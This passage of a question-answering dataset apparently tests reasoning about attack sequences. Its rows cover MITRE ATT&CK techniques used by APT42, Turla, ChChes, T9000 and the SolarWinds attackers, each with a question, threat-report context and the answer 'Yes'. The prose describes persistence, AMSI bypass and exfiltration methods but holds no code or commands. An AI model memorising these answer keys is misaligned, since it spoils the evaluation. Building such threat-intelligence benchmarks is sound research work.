Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1549,3,3-Command and Control-T1573-Encrypted Channel,"After APT42 conducts exfiltration of data over C2 channels, such as recorded phone calls and SMS inboxes, is it likely they will use encrypted channels for command and control communications with compromised systems?","Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1551,3,3-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After leveraging spear-phishing emails to gain initial access and executing arbitrary PowerShell or C# content using lightweight malware to communicate with C2 nodes, is APT42 likely to use custom malware to perform privilege escalation before employing techniques such as obfuscating information or process injection to evade defenses?",Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.,"Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1552,3,3-Credential Access-T1003-OS Credential Dumping,"After establishing persistence through scheduled tasks or Windows registry modifications, is APT42 likely to perform internal reconnaissance by accessing a compromised user’s contacts and collaborative spaces before proceeding with OS credential dumping for stealing credentials?","Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1555,3,3-Lateral Movement-T1534-Internal Spearphishing,"After conducting internal reconnaissance by accessing the user’s contacts and extracting system and network information, is it likely that APT42 will move laterally by using compromised personal email accounts to access corporate accounts before sending spear-phishing emails to additional targets leveraging the victim’s trusted relationships?","Lateral Movement: APT42 moves laterally by using compromised personal email accounts to access corporate accounts and vice versa. They send spear-phishing emails from compromised accounts to additional targets, leveraging the victim's trusted relationships.","Reconnaissance: Mandiant has high confidence that APT42, an Iranian state-sponsored cyber espionage group, has been active since at least 2015, engaging in highly targeted spear phishing and surveillance operations. APT42's operations are designed to build trust and rapport with victims, including government officials, former Iranian policymakers, members of the Iranian diaspora and opposition groups, journalists, and academics. The group deploys mobile malware to track victim locations, record phone conversations, and extract SMS inboxes.
Resource Development: APT42, assessed to be a prolific and well-resourced threat actor, carries out espionage and surveillance activity in support of Iran's strategic priorities. The group uses highly targeted social engineering efforts for credential harvesting, including collecting Multi-Factor Authentication (MFA) codes to bypass authentication methods. APT42 has also developed custom backdoors and lightweight tools to complement its arsenal, indicating the group's capability to incorporate these tools into their operations beyond credential harvesting.
Initial Access: APT42 primarily relies on spear phishing to perform initial compromises, engaging targets for days or weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment. The group is capable of bypassing MFA and intercepting SMS-based one-time passwords using credential harvesting forms and likely delivers Android malware via SMS messages.
Execution: APT42 establishes a foothold in victim environments by registering their own Microsoft Authenticator application as a new MFA method. The group uses a variety of primarily lightweight malware, some of which are based on publicly available scripts, to execute arbitrary PowerShell or C# content and communicate with C2 nodes via HTTP.
Persistence: To maintain their presence in a victim's environment, APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence. They also maintain access to a victim's personal or corporate email account by registering their Microsoft Authenticator application to receive MFA codes to their own devices and deleting login notification emails to cover their tracks.
Privilege Escalation: APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment.
Defense Evasion: APT42 employs various techniques to avoid detection, such as obfuscating files or information, process injection, and virtualization/sandbox evasion. They also use template injection and hide artifacts like hidden windows to evade defenses.
Credential Access: APT42's operations include stealing credentials to personal and corporate email accounts using methods such as OS credential dumping, two-factor authentication interception, and keylogging.
Discovery: APT42 conducts internal reconnaissance by browsing the compromised user's contacts and accessing the targeted organization's collaborative spaces, such as Sharepoint. They also use malware capable of taking screenshots and collecting system and network information.
Collection: APT42's objective includes stealing credentials and using them to conduct follow-on operations and steal personal or business documents. They also seek to track locations, monitor communications, and surveil activities of individuals of interest to the Iranian government.
Command and Control: APT42 uses application layer protocols, web services, and encrypted channels for command and control communications with compromised systems.
Exfiltration: APT42 exfiltrates data over C2 channels, including recorded phone calls, room audio recordings, images, and entire SMS inboxes from compromised devices.",Yes,APT42_Crooked_Charms_Cons_and_Compromises
1563,300,300-Command and Control-T1071-Application Layer Protocol,"After compromising SolarWinds and delivering the Sunburst backdoor through a supply-chain attack for initial access, is it likely that the Sunburst backdoor will communicate with its C2 server using a protocol for further exploitation?","Command and Control: In the SolarWinds incident, the Sunburst backdoor communicated with its C2 server and used a protocol to upgrade victims for further exploitation. The backdoor revealed features overlapping with Kazuar, a .NET backdoor linked to the Turla APT group. The shared features included the victim UID generation algorithm, sleep algorithm, and the use of the FNV1a hash to obfuscate string comparisons. Kaspersky telemetry revealed a spike in exploitation attempts for the Exchange vulnerabilities following public disclosure and patch from Microsoft. Approximately 1,400 unique servers were targeted, with one or more vulnerabilities used to obtain initial access and communicate with C2 servers.","Initial Access: In December, SolarWinds, an IT managed services provider, was compromised in a sophisticated supply-chain attack. The attackers deployed a custom backdoor, Sunburst, on the networks of over 18,000 customers. This initial access allowed for further exploitation. On March 2, Microsoft reported that HAFNIUM, a new APT actor, exploited four zero-days in Exchange Server for initial access. Volexity also reported the same Exchange zero-days being used in early 2021. A campaign active since mid-March targeted governmental entities in the Russian Federation using these Exchange zero-days. The campaign utilized a previously unknown malware family named FourteenHi. Traces of activity involving variants of this malware date back a year. There were overlaps with HAFNIUM in terms of infrastructure and TTPs, as well as the use of ShadowPad malware.",Yes,APT_trends_report_Q1_2021_Securelist
1564,301,301-Initial Access-T1566-Phishing,"After ChChes establishes communication with the C&C servers using HTTP cookie headers for defense evasion, is it likely that the malware will communicate with the C&C servers to receive commands and modules, expanding its capabilities through encrypted communication methods?","Initial Access: Since around October 2016, JPCERT/CC has been observing targeted emails sent to Japanese organizations. These emails contain a ZIP file attachment with executable files, which are disguised as Word documents using icons. The emails impersonate existing individuals and originate from free email services in Japan. Upon execution, the malware known as ChChes infects the system.","Defense Evasion: ChChes, a malware variant, employs a technique to communicate with its command and control (C&C) servers using HTTP cookie headers. The malware's HTTP requests use a path pattern of /[random string].htm, but the cookie values are encrypted strings that correspond to actual data for C&C communication. The encryption can be decrypted using a provided Python script. ChChes has been confirmed to use a specific code signing certificate to sign the executable files, which is detailed in Appendix A of the report.
Command and Control: ChChes communicates with C&C servers to receive commands and modules, which are then loaded into memory. The malware has limited functions on its own and relies on modules from C&C servers to expand its capabilities. The communication is initially encrypted using a custom method and later with AES encryption. The malware's communication flow includes an initial request containing encrypted data with the computer name, followed by a response from the C&C server with an ID for the infected machine. Subsequent requests are made for modules and commands, which are also encrypted. The malware can execute shell commands, upload and download files, run DLLs, and view tasks of bot commands.
Others: ChChes has been active since around October 2016 and is considered a new type of malware. JPCERT/CC is monitoring ChChes for continued use in targeted attacks. The report includes hash values of the malware samples in Appendix C and a list of destination hosts confirmed by JPCERT/CC in Appendix D. It is recommended to check for communication with these hosts to identify potential infections.",Yes,chches-malware--93d6.html
1568,302,302-Collection-T1025-Data from Removable Media,"After implementing file upload and download capabilities with its RPC backdoor during the discovery phase, is Turla likely to use its backdoor plugins to collect recent files and files from USB drives during the collection phase?","Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",Yes,A dive into Turla PowerShell usage
1570,302,302-Collection-T1530-Data from Cloud Storage,"After monitoring antimalware logs and the Windows process list using PowerStallion, is it likely that Turla will use Microsoft OneDrive as part of its command and control infrastructure before executing additional PowerShell scripts for collecting recent files from the local file system?","Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",Yes,A dive into Turla PowerShell usage
1572,302,302-Persistence-T1037-Boot or Logon Initialization Scripts,"After leveraging PowerShell to run malware directly in memory as part of Turla's execution phase, is it likely that the group will evade detection by encrypting payloads, obfuscating scripts, and patching the AmsiScanBuffer function in memory before using a modified PowerShell profile to run a script for persistence?","Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",Yes,A dive into Turla PowerShell usage
1575,302,302-Discovery-T1083-File and Directory Discovery,"After leveraging persistence methods like modifying the PowerShell profile to load scripts on PowerShell startup, is it likely that Turla's RPC backdoor will perform lateral movement to facilitate file and directory discovery before utilizing plugins to gather file and directory information?","Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",Yes,A dive into Turla PowerShell usage
1577,302,302-Discovery-T1057-Process Discovery,"After achieving persistent access through the use of WMI event subscriptions and modifications to PowerShell profiles, is it likely that the Turla group will use the PowerStallion backdoor to monitor the Windows process list during discovery before proceeding to collect and exfiltrate recent files through a OneDrive subfolder encrypted with XOR key 0xAA?","Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.","Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.
Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.",Yes,A dive into Turla PowerShell usage
1580,302,302-Exfiltration-T1041-Exfiltration Over C2 Channel,"After utilizing the RPC protocol and Microsoft OneDrive as command and control channels, is it likely that PowerStallion will exfiltrate information by writing encrypted command results to a OneDrive subfolder using XOR key 0xAA?",Exfiltration: PowerStallion exfiltrates information through the command and control channel by writing command results to a OneDrive subfolder and encrypting them with XOR key 0xAA.,"Execution: ESET researchers have analyzed new tactics, techniques, and procedures (TTPs) attributed to the Turla group, which involve leveraging PowerShell to run malware directly in memory, thus bypassing detection mechanisms that activate when a malicious executable is dropped on disk. The Turla group, also known as Snake, has been active since at least 2008 and is known for its sophisticated malware and espionage operations. The PowerShell scripts used by Turla persist on the system by regularly loading embedded executables into memory only, without writing them to disk.
Persistence: Turla operators have employed two methods for persistence: using a Windows Management Instrumentation (WMI) event subscription and altering the PowerShell profile (profile.ps1 file). In the case of WMI, attackers create event filters and consumers to execute base64-encoded PowerShell commands that load a large script stored in the Windows registry. The PowerShell profile is modified to run a script when PowerShell starts, which includes commands to load and execute the malware.
Defense Evasion: Turla's PowerShell scripts are designed to evade detection by encrypting payloads and obfuscating scripts. They also include an AMSI bypass technique that patches the AmsiScanBuffer function in memory to prevent antimalware products from receiving and scanning the buffer. This technique was not newly discovered but reused from a presentation at Black Hat Asia 2018.
Discovery: Turla's RPC backdoor and PowerStallion backdoor are used to perform lateral movement and take control of machines within a local network. They implement basic features such as file upload, download, and command execution. The RPC backdoor also supports the addition of plugins, which can gather file and directory information and monitor USB drives. PowerStallion monitors antimalware logs and the Windows process list.
Collection: Turla's RPC backdoor plugins are capable of collecting recent files from the local file system and files from USB drives. PowerStallion, a lightweight PowerShell backdoor, uses Microsoft OneDrive as a command and control server and can execute additional PowerShell scripts, writing command results to another OneDrive subfolder.
Command and Control: The RPC backdoor uses the RPC protocol for command and control, while PowerStallion uses Microsoft OneDrive, accessed via SMB, as its command and control server.",Yes,A dive into Turla PowerShell usage
1581,303,303-Initial Access-T1190-Exploit Public-Facing Application,"After T9000 malware gains initial access by exploiting vulnerabilities CVE-2012-1856 and CVE-2015-1641 through an RTF file, is it likely that it will utilize igfxtray.exe to sideload the malicious DLL hccutils.dll for subsequent execution prior to achieving persistence by modifying registry keys or injecting the ResN32.dll library into explorer.exe?","Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.","Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
Exfiltration: T9000 exfiltrated various types of data, including screenshots, Skype communications, and files from removable drives. The data was compressed, encrypted, and stored in specific directories or sent to the C2 server. The malware also logged file and directory operations, clipboard data, and encrypted network traffic to collect sensitive information.
Others: The T9000 malware was observed in targeted attacks against organizations in the United States, with functionality indicating broad user targeting. It was part of the T5000 malware family and known for its extensive evasion techniques. Palo Alto Networks' Threat Prevention, Traps, WildFire, and AutoFocus provided protection against T9000/T5000 attacks. The malware's author took significant measures to avoid detection and analysis by the security community.",Yes,PaloAlto_t9000-advanced-modular-backdoor-uses-complex-anti-analysis-techniques.2016.02.04
1586,303,303-Defense Evasion-T1497-Virtualization/Sandbox Evasion,"After establishing persistence by modifying registry keys to ensure malicious DLLs run after a reboot, is it likely that T9000 will perform sandbox evasion by designing its multi-stage installation process to avoid detection from security researchers and analysis environments?",Defense Evasion: T9000 was designed to evade detection by customizing its installation to avoid 24 identified security products. It used a multi-stage installation process with checks at each stage to detect analysis by security researchers. The malware also created mutexes and named events to ensure only one instance was running and to manage its components.,"Initial Access: The T9000 malware, a variant of the T5000 family, was initially delivered via an RTF file exploiting CVE-2012-1856 and CVE-2015-1641. Upon activation, a multi-stage execution process began, starting with an initial shellcode stage responsible for locating and executing a secondary shellcode stub. This stub then decrypted and executed an embedded payload, creating a temporary file in the %TEMP% folder and executing it using WinExec.
Execution: The execution of T9000 involved a legitimate Microsoft executable, igfxtray.exe, which sideloaded a malicious DLL, hccutils.dll. This DLL performed security product checks and initiated the next stage of execution depending on the victim's system properties and installed security products. The malware used three techniques for persistence, including setting registry keys and injecting the ResN32.dll library into the explorer.exe process.
Persistence: T9000 established persistence through various methods, including modifying registry keys such as HKLM\Software\Microsoft\Windows\CurrentVersion\Run and HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows, to ensure the malicious DLLs would run after reboot or load with every user mode process spawned. Additionally, it injected the ResN32.dll library into the explorer.exe process for persistent execution.
Collection: T9000 was configured to automatically capture data about the infected system and steal files of specific types stored on removable media. It also targeted Skype users, capturing encrypted data, screenshots of specific applications, and Skype communications including video calls, audio calls, and chat messages.
Command and Control: The malware communicated with a C2 server using a binary protocol over a specified port, sending encrypted traffic that included a beacon and collected information from the victim machine. The C2 server's IP address and port were extracted from the configuration file, and the malware supported proxy usage for victims behind web proxies.
